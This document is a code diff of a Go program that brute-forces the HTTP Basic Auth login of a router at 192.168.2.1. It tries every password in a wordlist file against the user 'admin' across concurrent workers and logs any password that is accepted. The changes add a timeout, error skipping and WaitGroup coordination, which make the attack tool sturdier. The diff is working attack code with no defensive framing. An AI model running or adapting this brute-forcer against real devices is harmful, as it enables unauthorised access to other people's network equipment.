@@ -7,10 +7,13 @@ import (
 	"os"
 	"runtime"
 	"strings"
+	"sync"
+	"time"
 )
 
 var (
 	wguid int = 0
+	wg    sync.WaitGroup
 )
 
 // the request worker
@@ -19,7 +22,6 @@ type Worker struct {
 	client  *http.Client
 	request *http.Request
 	tpwd    chan string
-	pwd     chan string
 }
 
 func newRequest(address string) (*http.Request, error) {
@@ -34,10 +36,11 @@ func newRequest(address string) (*http.Request, error) {
 	return req, nil
 }
 
-func NewWorker(host string, tpwd, pwd chan string) (*Worker, error) {
+func NewWorker(host string, tpwd chan string) (*Worker, error) {
 	transport := &http.Transport{}
 	client := &http.Client{
 		Transport: transport,
+		Timeout:   time.Second * 3,
 	}
 	req, err := newRequest(host)
 	if err != nil {
@@ -48,7 +51,6 @@ func NewWorker(host string, tpwd, pwd chan string) (*Worker, error) {
 		client:  client,
 		request: req,
 		tpwd:    tpwd,
-		pwd:     pwd,
 	}
 	wguid += 1
 	return w, nil
@@ -64,18 +66,23 @@ func (w *Worker) Try() {
 		line = strings.TrimSpace(line)
 		w.request.SetBasicAuth("admin", line)
 		resp, err := w.client.Do(w.request)
+		if err != nil {
+			log.Printf("request do error: %s", err.Error())
+			continue
+		}
 		defer resp.Body.Close()
 		if err != nil {
 			log.Printf("Worker%d try password:%s err:%s\n", w.Wid(), line, err.Error())
-			return
+			continue
 		}
 		if resp.StatusCode < 400 {
-			w.pwd <- line
+			log.Println("Get password:", line)
+			wg.Done()
 			return
 		}
 		log.Printf("Worker%d try password:%s code:%d\n", w.Wid(), line, resp.StatusCode)
 	}
-	close(w.pwd)
+	wg.Done()
 }
 
 func scanFile(f *os.File, tpwd chan string) {
@@ -85,7 +92,6 @@ func scanFile(f *os.File, tpwd chan string) {
 	for scanner.Scan() {
 		line = scanner.Text()
 		tpwd <- line
-		// log.Printf("Scan text:%s\n", line)
 	}
 	if err := scanner.Err(); err != nil {
 		log.Printf("Scan error:%s\n", err.Error())
@@ -96,7 +102,6 @@ func scanFile(f *os.File, tpwd chan string) {
 func main() {
 	maxcpus := runtime.NumCPU()
 	tpwd := make(chan string, maxcpus-1)
-	pwd := make(chan string, 1)
 	filename := "password.txt"
 	f, err := os.Open(filename)
 	if err != nil {
@@ -105,8 +110,9 @@ func main() {
 	runtime.GOMAXPROCS(maxcpus)
 	go scanFile(f, tpwd)
 
+	wg.Add(maxcpus - 1)
 	for i := 0; i < maxcpus-1; i++ {
-		w, err := NewWorker("http://192.168.2.1", tpwd, pwd)
+		w, err := NewWorker("http://192.168.2.1", tpwd)
 		log.Printf("Start worker%d\n", w.Wid())
 		if err != nil {
 			log.Printf("Error:%s\n", err.Error())
@@ -115,10 +121,6 @@ func main() {
 		go w.Try()
 	}
 
-	getpwd, ok := <-pwd
-	if ok {
-		log.Printf("Get password:%s\n", getpwd)
-	} else {
-		log.Println("Get nothing")
-	}
+	wg.Wait()
+	log.Println("Done.")
 }
